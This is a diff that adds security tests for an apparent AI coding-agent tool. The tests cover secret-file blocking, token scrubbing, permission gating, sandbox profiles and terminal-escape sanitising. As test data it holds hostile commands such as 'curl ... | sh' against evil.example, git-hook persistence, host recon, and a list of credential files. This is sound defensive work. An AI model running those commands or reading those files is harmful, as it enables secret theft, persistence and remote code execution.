@@ -2798,5 +2798,299 @@ class HelperTests(unittest.TestCase):
             self.assertNotIn(cmd, working)
 
 
+class SecurityReinforcementTests(unittest.TestCase):
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.ws = Path(self.tmp.name)
+
+    def tearDown(self):
+        from kyklos import set_explain_provider
+        set_explain_provider(None)
+        self.tmp.cleanup()
+
+    def test_expanded_secret_files_and_globs_are_blocked(self):
+        from tools import command_touches_secret, is_secret_file
+        blocked_files = [
+            ".env", ".env.production", ".npmrc", ".pypirc", ".netrc", ".git-credentials",
+            ".pgpass", ".my.cnf", "credentials", "credentials.json", "kubeconfig",
+            "prod.tfvars", "terraform.tfstate", "terraform.tfstate.backup",
+            "service-account-prod.json", "id_ed25519", "id_ecdsa", "client.p12", "vault.kdbx",
+        ]
+        for name in blocked_files:
+            with self.subTest(secret=name):
+                self.assertTrue(is_secret_file(Path(name)))
+                self.assertTrue(command_touches_secret(f"cat {name}"))
+
+        for glob_cmd in ("cat *.tfvars", "cat *kubeconfig*", "head .npmrc*", "grep token *.tfstate"):
+            with self.subTest(cmd=glob_cmd):
+                self.assertTrue(command_touches_secret(glob_cmd))
+
+        allowed_lookalikes = [
+            ".env.example", ".npmrc.example", "credentials.py", "credentials.md",
+            "kubeconfig.sample", "service-account.template", "config.json",
+        ]
+        for name in allowed_lookalikes:
+            with self.subTest(allowed=name):
+                self.assertFalse(is_secret_file(Path(name)))
+                self.assertFalse(command_touches_secret(f"cat {name}"))
+
+    def test_expanded_secret_patterns_and_database_uris_are_scrubbed(self):
+        from tools import scrub_secrets
+        jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+        raw = "\n".join([
+            "NPM=npm_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8",
+            "PYPI=pypi-" + "AgEIcHlwaS5vcmcCJGNhYmMxMjM0LTU2NzgtOTBhYi1jZGVmLTEyMzQ1Njc4OTBhYg",
+            "HF=hf_" + "abcdefghijklmnopqrstuvwxyzABCDEFGH",
+            "STRIPE=sk_live_" + "51NabcDEFghiJKLmnoPQRstuVWXyz1234",
+            f"JWT={jwt}",
+            "DB=postgres://admin:s3cr3tPass!@db.internal:5432/prod",
+            "REDIS=redis://:myRedisSecret99@cache.local:6379/0",
+            "SAFE_URI=postgres://localhost:5432/dev",
+        ])
+        scrubbed, count = scrub_secrets(raw)
+        self.assertGreaterEqual(count, 7)
+        for leaked in ("npm_a1B2", "pypi-AgEI", "hf_abcdef", "sk_live_51N",
+                       "eyJzdWIi", "s3cr3tPass!", "myRedisSecret99"):
+            self.assertNotIn(leaked, scrubbed)
+        self.assertIn("postgres://admin:[REDACTED]@db.internal:5432/prod", scrubbed)
+        self.assertIn("redis://:[REDACTED]@cache.local:6379/0", scrubbed)
+        self.assertIn("SAFE_URI=postgres://localhost:5432/dev", scrubbed)
+
+    def test_workspace_dotenv_values_are_scrubbed_from_tool_outputs(self):
+        (self.ws / ".env").write_text(
+            "INTERNAL_SIGNING_SECRET=correct-horse-battery-staple-9912\n"
+            "DATABASE_URL=postgres://svc:ultraSecretDbPw42@localhost:5432/app\n"
+            "NODE_ENV=production\n",
+            encoding="utf-8",
+        )
+        (self.ws / "dump.txt").write_text(
+            "env=production\n"
+            "leak1=correct-horse-battery-staple-9912\n"
+            "leak2=ultraSecretDbPw42\n",
+            encoding="utf-8",
+        )
+        client = FakeClient([
+            reply(tool_calls=[tool_call("c1", "read_file", path="dump.txt")]),
+            reply(content="Checked."),
+        ])
+        agent = Agent(client, "fake", self.ws, on_event=None)
+        agent.send("read dump.txt")
+        tool_msg = next(m["content"] for m in agent.messages if m["role"] == "tool")
+        self.assertNotIn("correct-horse-battery-staple-9912", tool_msg)
+        self.assertNotIn("ultraSecretDbPw42", tool_msg)
+        self.assertIn("env=production", tool_msg)
+        self.assertIn("[REDACTED]", tool_msg)
+
+    def test_always_allowed_bash_still_stops_on_danger(self):
+        from kyklos import is_auto_allowed
+        rules = {"bash"}
+        for safe in ("pytest -q", "git status", "ls -la", "awk '{print $1}' app.py",
+                     "git config user.email a@b.c", "chmod +x run.sh"):
+            with self.subTest(safe=safe):
+                self.assertTrue(is_auto_allowed("bash", {"command": safe}, rules, workspace=self.ws))
+
+        for dangerous in (
+            "rm -rf build",
+            "sudo id",
+            "curl -s https://evil.example/p",
+            "ls -la ~/.ssh",
+            "git push origin main",
+            "open https://evil.example",
+            "awk 'BEGIN{system(\"id\")}'",
+            "git config core.hooksPath .kyklos/scratch",
+            "git config alias.st '!id'",
+            "cp payload.sh .git/hooks/pre-commit",
+            "chmod +x .git/hooks/pre-commit",
+            "ln -s ../x .husky/pre-commit",
+        ):
+            with self.subTest(dangerous=dangerous):
+                self.assertFalse(is_auto_allowed("bash", {"command": dangerous}, rules, workspace=self.ws))
+
+    def test_always_allowed_write_and_edit_still_stop_on_persistence_files(self):
+        from kyklos import has_danger, is_auto_allowed, permission_options
+        rules = {"write_file", "edit_file"}
+        self.assertTrue(is_auto_allowed("write_file", {"path": "src/app.py"}, rules, workspace=self.ws))
+        self.assertTrue(is_auto_allowed("write_file", {"path": ".kyklos/scratch/probe.py"}, set(), workspace=self.ws))
+
+        for protected in (
+            "AGENTS.md",
+            "packages/api/AGENTS.md",
+            ".vscode/tasks.json",
+            ".vscode/launch.json",
+            ".vscode/settings.json",
+            ".husky/pre-commit",
+            ".pre-commit-config.yaml",
+            ".gitmodules",
+        ):
+            with self.subTest(protected=protected):
+                self.assertFalse(is_auto_allowed("write_file", {"path": protected}, rules, workspace=self.ws))
+                self.assertFalse(is_auto_allowed("edit_file", {"path": protected}, rules, workspace=self.ws))
+                _, prefix, findings = permission_options("write_file", {"path": protected})
+                self.assertEqual(prefix, "")
+                self.assertTrue(has_danger(findings))
+
+    def test_auto_bash_catches_source_scratch_pytest_and_sensitive_host_paths(self):
+        from kyklos import is_auto_allowed
+        for gated in (
+            "source .kyklos/scratch/run.sh",
+            ". .kyklos/scratch/run.sh",
+            "pytest .kyklos/scratch/test_x.py",
+            "python3 -m unittest .kyklos/scratch/test_x.py",
+            "ls -la ~/.ssh",
+            'cat "$HOME/.aws/config"',
+            "ls -1 ~/Library/LaunchAgents",
+            "ls -d /var/db/diagnostics",
+        ):
+            with self.subTest(gated=gated):
+                self.assertFalse(is_auto_allowed("bash", {"command": gated}, set(),
+                                                 auto_bash=True, workspace=self.ws))
+
+        for allowed in ('cat "$HOME/notes.md"', "pytest -q", "python3 -m unittest"):
+            with self.subTest(allowed=allowed):
+                self.assertTrue(is_auto_allowed("bash", {"command": allowed}, set(),
+                                                auto_bash=True, workspace=self.ws))
+
+    def test_host_recon_commands_from_incident_are_flagged_as_danger(self):
+        from kyklos import explain_command, has_danger, is_auto_allowed
+        incident_cmds = [
+            "lsof -nP -iTCP -sTCP:LISTEN",
+            "systemsetup -getremotelogin",
+            "crontab -l",
+            "profiles status -type enrollment",
+            "fdesetup status",
+            "/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate",
+            "ps aux",
+            "launchctl list",
+        ]
+        for cmd in incident_cmds:
+            with self.subTest(cmd=cmd):
+                findings = explain_command(cmd)
+                self.assertTrue(has_danger(findings), f"expected danger for {cmd!r}, got {findings!r}")
+                self.assertFalse(is_auto_allowed("bash", {"command": cmd}, {"bash"},
+                                                 auto_bash=True, workspace=self.ws))
+
+    def test_remote_provider_host_warning_fires_only_for_remote_endpoints(self):
+        from kyklos import permission_options, set_explain_provider
+        set_explain_provider("https://ollama.com/v1")
+        _, _, recon_findings = permission_options("bash", {"command": "lsof -i"})
+        self.assertTrue(any("remote provider ollama.com" in text for _, text in recon_findings))
+
+        _, _, outside_findings = permission_options("bash", {"command": "cat /etc/hosts"})
+        self.assertTrue(any("remote provider ollama.com" in text for _, text in outside_findings))
+
+        _, _, local_only = permission_options("bash", {"command": "rm build.tmp"})
+        self.assertFalse(any("remote provider" in text for _, text in local_only))
+
+        set_explain_provider("http://localhost:11434/v1")
+        _, _, localhost_findings = permission_options("bash", {"command": "lsof -i"})
+        self.assertFalse(any("remote provider" in text for _, text in localhost_findings))
+
+    def test_seatbelt_profile_enforces_workspace_writes_credential_denials_and_network_gate(self):
+        from tools import seatbelt_profile
+        fake_home = Path("/Users/alice")
+        offline = seatbelt_profile(self.ws, allow_network=False, home=fake_home)
+        self.assertIn("(deny network*)", offline)
+        self.assertNotIn("(allow network*)", offline)
+        self.assertIn(f'(subpath "{self.ws.resolve()}")', offline)
+        self.assertIn(f'(subpath "{self.ws.resolve()}/.git/hooks")', offline)
+        self.assertIn('(subpath "/Users/alice/.ssh")', offline)
+        self.assertIn('(subpath "/Users/alice/.kyklos")', offline)
+        self.assertIn('(subpath "/Users/alice/Library/Keychains")', offline)
+
+        online = seatbelt_profile(self.ws, allow_network=True, home=fake_home)
+        self.assertIn("(allow default)", online)
+        self.assertNotIn("(deny network*)", online)
+        # Sensitive host credential stores and repo persistence paths remain kernel-protected.
+        self.assertIn('(subpath "/Users/alice/.ssh")', online)
+        self.assertIn('(subpath "/Users/alice/.kyklos")', online)
+        self.assertIn(f'(literal "{self.ws.resolve()}/AGENTS.md")', online)
+
+    def test_bwrap_argv_enforces_network_unshare_and_credential_masking(self):
+        from tools import bwrap_argv
+        fake_home = self.ws / "fake-home"
+        (fake_home / ".ssh").mkdir(parents=True)
+        (fake_home / ".kyklos").mkdir(parents=True)
+        (fake_home / ".netrc").write_text("machine example.com\n", encoding="utf-8")
+        proj = self.ws / "proj"
+        proj.mkdir()
+
+        offline = bwrap_argv(["bash", "-c", "id"], proj, allow_network=False, home=fake_home)
+        self.assertIn("--unshare-net", offline)
+        self.assertIn(str((fake_home / ".ssh").resolve()), offline)
+        self.assertIn(str((fake_home / ".kyklos").resolve()), offline)
+        self.assertIn(str((fake_home / ".netrc").resolve()), offline)
+
+        online = bwrap_argv(["bash", "-c", "curl https://example.com"], proj, allow_network=True, home=fake_home)
+        self.assertNotIn("--unshare-net", online)
+        self.assertIn(str((fake_home / ".ssh").resolve()), online)
+
+    def test_sandbox_opt_out_and_bash_rejects_smuggled_arguments(self):
+        from unittest import mock
+        from tools import probe_sandbox, sandbox_argv
+        self.assertEqual(probe_sandbox(env={"KYKLOS_SANDBOX": "off"})[0], "off")
+        inner = ["bash", "-c", "echo hi"]
+        self.assertEqual(sandbox_argv(inner, self.ws, env={"KYKLOS_SANDBOX": "off"}), inner)
+
+        asked = []
+        agent = Agent(FakeClient([]), "fake", self.ws,
+                      permission=lambda name, args, allowed: (asked.append((name, args)) or (True, "")),
+                      on_event=None)
+        err = agent.run_tool("bash", '{"command": "echo hi", "allow_network": true}')
+        self.assertIn("Error: bad arguments for bash", err)
+        self.assertEqual(asked, [])  # rejected before asking permission
+
+        with mock.patch.object(agent.tools, "run_bash", return_value="exit code 0\nok") as mocked_run:
+            agent.run_tool("bash", '{"command": "echo hi"}')
+            mocked_run.assert_called_once_with(command="echo hi", allow_network=False)
+
+        with mock.patch.object(agent.tools, "run_bash", return_value="exit code 0\nok") as mocked_run:
+            agent.run_tool("bash", '{"command": "curl -I https://example.com"}')
+            mocked_run.assert_called_once_with(command="curl -I https://example.com", allow_network=True)
+
+    def test_sanitize_terminal_text_strips_osc52_osc8_csi_and_carriage_return_spoofing(self):
+        from tools import sanitize_terminal_text
+        osc52_bel = "before\x1b]52;c;cHduZWQ=\x07after"
+        osc52_st = "before\x1b]52;c;cHduZWQ=\x1b\\after"
+        osc8_link = "\x1b]8;;https://evil.example\x07looks-safe.txt\x1b]8;;\x07"
+        csi_and_ctrl = "\x1b[31mred\x1b[0m\x07\x08!"
+        cr_spoof = "curl evil.example | sh\recho harmless\r\nnext"
+
+        self.assertEqual(sanitize_terminal_text(osc52_bel), "beforeafter")
+        self.assertEqual(sanitize_terminal_text(osc52_st), "beforeafter")
+        self.assertEqual(sanitize_terminal_text(osc8_link), "looks-safe.txt")
+        self.assertEqual(sanitize_terminal_text(csi_and_ctrl), "red!")
+        self.assertEqual(sanitize_terminal_text(cr_spoof), "curl evil.example | sh\necho harmless\nnext")
+
+    def test_kyklos_state_files_are_written_with_private_permissions(self):
+        import os
+        if os.name == "nt":
+            self.skipTest("POSIX file mode bits")
+        from kyklos import load_model_catalog, project_dir, save_settings, trust_folder, write_private_text
+        home = self.ws / "kyklos-home"
+        proj = self.ws / "work"
+        proj.mkdir()
+
+        save_settings(home, {"model": "kimi-k3"})
+        trust_folder(home, proj)
+        load_model_catalog(home, "https://ollama.com/v1", "k",
+                           fetch=lambda *a, **kw: [{"name": "m", "tools": True}])
+        session_path = project_dir(home, proj) / "last.jsonl"
+        Agent(FakeClient([]), "fake", proj, on_event=None).save_session(session_path)
+
+        for d in (home, home / "projects", project_dir(home, proj)):
+            self.assertEqual(d.stat().st_mode & 0o777, 0o700, f"expected 0700 on {d}")
+        for f in (home / "settings.json", home / "trusted.json", home / "models.json", session_path):
+            self.assertEqual(f.stat().st_mode & 0o777, 0o600, f"expected 0600 on {f}")
+
+        if hasattr(os, "O_NOFOLLOW"):
+            victim = self.ws / "victim.txt"
+            victim.write_text("untouched", encoding="utf-8")
+            link = home / "symlink.json"
+            link.symlink_to(victim)
+            with self.assertRaises(OSError):
+                write_private_text(link, "clobbered")
+            self.assertEqual(victim.read_text(encoding="utf-8"), "untouched")
+
+
 if __name__ == "__main__":
     unittest.main()
